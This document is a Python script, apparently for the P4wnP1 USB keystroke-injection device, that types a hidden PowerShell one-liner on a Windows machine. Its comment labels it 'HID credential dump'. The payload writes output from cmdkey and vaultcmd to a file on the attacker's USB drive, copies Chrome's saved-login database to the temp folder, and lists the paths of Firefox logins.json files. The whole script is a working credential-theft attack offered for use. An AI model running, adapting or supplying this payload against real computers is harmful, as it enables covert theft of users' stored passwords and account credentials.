#!/usr/bin/env python3
import os, time, sys
P4WN_HOME = os.environ.get("P4WN_HOME", "/opt/p4wnp1")
sys.path.insert(0, os.path.join(P4WN_HOME, "tools"))
from p4wnhid import send_key, send_string, enter, sleep_ms

def main():
    print("[*] Running: win_browser_creds (HID credential dump)")

    send_key("GUI", "R")
    sleep_ms(300)
    send_string("powershell")
    enter()
    sleep_ms(800)

    payload = r'''
$drive = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Root -match "^[A-Z]:\\" -and (Test-Path "$($_.Root)\P4wnP1.txt") } | Select-Object -First 1
if (-not $drive) { $drive = Get-PSDrive -PSProvider FileSystem | Where-Object { Test-Path "$($_.Root)\autorun.ps1" } | Select-Object -First 1 }
$drive = $drive.Root

$OutFile = "$drive\creds.txt"

"`n[Credentials]" | Out-File -FilePath $OutFile -Append
cmdkey /list | Out-File -FilePath $OutFile -Append

"`n[Vaults]" | Out-File -FilePath $OutFile -Append
vaultcmd /list | Out-File -FilePath $OutFile -Append

"`n[Chrome Logins]" | Out-File -FilePath $OutFile -Append
$chrome = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
if (Test-Path $chrome) {
  Copy-Item $chrome "$env:TEMP\LoginData.db"
  "Copied Chrome Login Data to TEMP" | Out-File -FilePath $OutFile -Append
}

"`n[Firefox Profiles]" | Out-File -FilePath $OutFile -Append
$ff = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Recurse -Filter "logins.json" -ErrorAction SilentlyContinue
foreach ($f in $ff) {
  "Found: $($f.FullName)" | Out-File -FilePath $OutFile -Append
}
'''.strip().replace("\n", "; ")

    one_liner = f"powershell -nop -w hidden -c \"{payload}\""
    send_string(one_liner)
    enter()

if __name__ == "__main__":
    main()
